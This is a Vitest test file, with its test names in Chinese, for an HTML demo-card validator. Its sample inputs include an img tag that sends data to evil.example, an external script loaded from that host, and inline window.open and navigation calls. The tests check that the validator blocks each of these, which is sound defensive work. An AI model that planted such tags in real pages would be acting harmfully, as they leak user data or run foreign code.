import { describe, it, expect } from 'vitest'
import { validateDemoHtml } from '../src/validate.js'

describe('validateDemoHtml', () => {
  it('通过干净的内联 demo 卡片', () => {
    const ok = validateDemoHtml(`<div id="root"><style>#root{padding:8px}</style><p>步骤 1</p></div>`)
    expect(ok.ok).toBe(true)
  })

  it('拦截外联 img 数据外泄', () => {
    const r = validateDemoHtml(`<div id="r"><img src="https://evil.example/x.png?data=1"></div>`)
    expect(r.ok).toBe(false)
    expect(r.issues.some((i) => i.rule === 'external-resource')).toBe(true)
  })

  it('拦截外联脚本', () => {
    const r = validateDemoHtml(`<div id="r"><script src="https://evil.example/s.js"></script></div>`)
    expect(r.ok).toBe(false)
    expect(r.issues.some((i) => i.rule === 'script-src')).toBe(true)
  })

  it('拦截 backdrop-filter 与 window.open 与导航', () => {
    const r = validateDemoHtml(`<div id="r" style="backdrop-filter:blur(4px)">x</div>`)
    expect(r.issues.some((i) => i.rule === 'backdrop-filter')).toBe(true)
    const r2 = validateDemoHtml(`<div id="r"><script>window.open('http://x');location.href='http://y'</script></div>`)
    expect(r2.issues.some((i) => i.rule === 'window-open')).toBe(true)
    expect(r2.issues.some((i) => i.rule === 'navigation')).toBe(true)
  })

  it('缺少根容器即不合格', () => {
    const r = validateDemoHtml(`<p>裸段落</p>`)
    expect(r.ok).toBe(false)
    expect(r.issues.some((i) => i.rule === 'root-container')).toBe(true)
  })
})